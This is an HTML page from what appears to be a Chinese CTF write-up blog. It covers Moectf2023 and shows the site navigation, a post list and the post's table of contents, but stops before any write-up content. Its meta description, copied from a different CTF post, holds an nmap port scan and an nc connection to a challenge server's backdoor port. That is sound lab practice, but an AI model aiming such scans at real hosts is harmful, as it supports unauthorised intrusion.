@@ -1,0 +1,1742 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Moectf2023 | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="Moectf2023 | 甜筒园">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CITS1003 CTF wp">
+<meta property="og:url" content="https://www.ttycp3.top/archives/f8a3bab8.html">
+<meta property="og:site_name" content="甜筒园">
+<meta property="og:description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:locale">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png">
+<meta property="article:published_time" content="2024-05-09T08:21:59.504Z">
+<meta property="article:modified_time" content="2024-05-14T09:33:11.466Z">
+<meta property="article:author" content="ttycp3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+
+
+<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
+</a>
+<div class="author">
+    <span>ttycp3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/ttycp3"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="csdn"
+               href="https://blog.csdn.net/qq_33814823"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-csdn"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=1765543783"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(32)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="Writeup">
+                        
+                        Writeup
+                        <small>(25)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="笔记">
+                        
+                        笔记
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="工具">
+                        
+                        工具
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="算法竞赛专题">
+                        
+                        算法竞赛专题
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="32">
+<input type="hidden" id="yelog_site_word_count" value="40.6k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>流量分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>杂项</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gopher协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>grafana</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>JAVA安全</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>session反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XPath注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe漏洞</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f8a3bab8.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
+            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e228e2bf.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
+            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/53f30b58.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NCTF2023web（赛后复现）">NCTF2023web（赛后复现）</span>
+            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3b79de97.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
+            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/d4f5203b.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
+            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/83697f53.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Moectf2023">Moectf2023</span>
+            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7a95ce38.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
+            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/1d622977.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第16届ciscn初赛wp">第16届ciscn初赛wp</span>
+            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7dc07b0.html"
+           data-tag="流量分析,杂项"
+           data-author="" >
+            <span class="post-title" title="第四届闽盾杯Misc流量分析">第四届闽盾杯Misc流量分析</span>
+            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/4524613a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ångstromCTF 2023">ångstromCTF 2023</span>
+            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/37321197.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
+            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3527c39a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第三届红明谷杯">第三届红明谷杯</span>
+            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/6ee431f.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
+            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e92ae896.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
+            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/c603889a.html"
+           data-tag="pickle反序列化,jwt伪造"
+           data-author="" >
+            <span class="post-title" title="CISCN2019 华北赛区 Day1 ikun">CISCN2019 华北赛区 Day1 ikun</span>
+            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/b85a28bc.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTFSHOW第三届愚人杯部分WP">CTFSHOW第三届愚人杯部分WP</span>
+            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/fcef946.html"
+           data-tag="文件上传,任意文件读取,JAVA安全"
+           data-author="" >
+            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
+            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/56a79676.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
+            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f06c7905.html"
+           data-tag="ssrf漏洞,gopher协议"
+           data-author="" >
+            <span class="post-title" title="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/2e3a56ed.html"
+           data-tag="xxe漏洞"
+           data-author="" >
+            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/32149828.html"
+           data-tag="ssrf漏洞,session反序列化,CRLF Injection"
+           data-author="" >
+            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
+            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/54488cb7.html"
+           data-tag="XPath注入"
+           data-author="" >
+            <span class="post-title" title="Xpath笔记">Xpath笔记</span>
+            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/68b41866.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="常用简单模板">常用简单模板</span>
+            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/2bd6ac.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="从c升级到c++速成">从c升级到c++速成</span>
+            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/66731dbe.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
+            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/ac4562c6.html"
+           data-tag="命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow七夕杯wp">ctfshow七夕杯wp</span>
+            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/ec3e2815.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Webshell笔记">Webshell笔记</span>
+            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e9530a94.html"
+           data-tag="grafana"
+           data-author="" >
+            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
+            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/1a0e10db.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF笔记">SSRF笔记</span>
+            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/a00344c6.html"
+           data-tag="sql注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入笔记">SQL注入笔记</span>
+            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
+        </a>
+        
+        
+        <a  class="All 工具 "
+           href="/archives/7450bfcb.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="实用工具">实用工具</span>
+            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/bff3fd5a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="攻防世界web新手区Writeup">攻防世界web新手区Writeup</span>
+            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Moectf2023" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Moectf2023</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Writeup">Writeup</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-10-04 14:36:13'>2023-09-16 11:44</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:5.5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-text">http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Web入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-text">彼岸的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gas-gas-gas"><span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-text">moe图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-text">了解你的座驾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meo%E5%9B%BE%E5%BA%8A"><span class="toc-text">meo图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="toc-text">夺命十三枪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E5%BF%83%E6%B5%B7"><span class="toc-text">出去旅游的心海</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moeworld"><span class="toc-text">moeworld</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Misc 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%871"><span class="toc-text">打不开的图片1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%872"><span class="toc-text">打不开的图片2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-1-%E6%99%AE%E9%80%9A%E7%9A%84%E7%8C%AB"><span class="toc-text">狗子(1) 普通的猫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#building-near-lake"><span class="toc-text">building_near_lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8A%E5%98%9F%E5%81%87%E5%98%9F%EF%BC%9F"><span class="toc-text">尊嘟假嘟？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AB%E7%83%AB%E7%83%AB"><span class="toc-text">烫烫烫</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Crypto 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-e"><span class="toc-text">baby_e</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail"><span class="toc-text">Jail</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-0"><span class="toc-text">Jail Level 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-1"><span class="toc-text">Jail Level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-2"><span class="toc-text">Jail Level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-4"><span class="toc-text">Jail Level 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E8%BA%AB%E6%90%BA%E5%B8%A6%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">随身携带的虚拟机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AI"><span class="toc-text">AI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AI%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">AI入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-MLP"><span class="toc-text">EZ MLP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC"><span class="toc-text">ABC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CLASSIAL-CRYPTO"><span class="toc-text">CLASSIAL CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrot"><span class="toc-text">ezrot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%8F%AF%E7%9A%84%E6%96%B0%E5%9B%B4%E5%A2%99"><span class="toc-text">可可的新围墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9A%87%E5%B8%9D%E7%9A%84%E6%96%B0%E5%AF%86%E7%A0%81"><span class="toc-text">皇帝的新密码</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-text">http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Web入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-text">彼岸的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gas-gas-gas"><span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-text">moe图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-text">了解你的座驾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 